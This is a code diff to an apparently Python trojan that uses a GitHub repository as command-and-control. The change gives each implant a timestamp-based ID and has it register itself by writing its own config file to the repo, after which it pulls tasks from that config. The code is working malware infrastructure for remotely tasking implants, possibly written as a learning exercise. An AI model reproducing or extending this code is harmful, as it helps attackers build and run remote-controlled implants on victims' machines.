@@ -7,6 +7,7 @@ import random
 import threading
 import queue as Queue
 import os
+import time
 import _____
 from github3 import login
 
@@ -27,7 +28,8 @@ class HubHandler:
     """
 
     def __init__(self):
-        self.trojan_id = "abc"
+        self.trojan_id = str(time.time()).replace('.','_')
+        self.registered = False
         
         self.trojan_config = "config/%s.json" % self.trojan_id
         self.data_path = "data/%s/" % self.trojan_id
@@ -56,8 +58,15 @@ class HubHandler:
         return None
 
     def apply_config(self):
-       # maybe this could be optiized away and store config in object
-       config_json = self.get_file(self.trojan_config)
+       config_json = None
+       if not self.registered:
+            config_json = self.get_file("config/default.json")
+            self.repo.create_file(self.trojan_config,
+                   "registering %s" % self.trojan_id,
+                   base64.b64encode(config_json))
+            self.registered = True
+       else:
+           config_json = self.get_file(self.trojan_config)
        config = json.loads(base64.b64decode(config_json))
        self.configured = True
        for task in config:
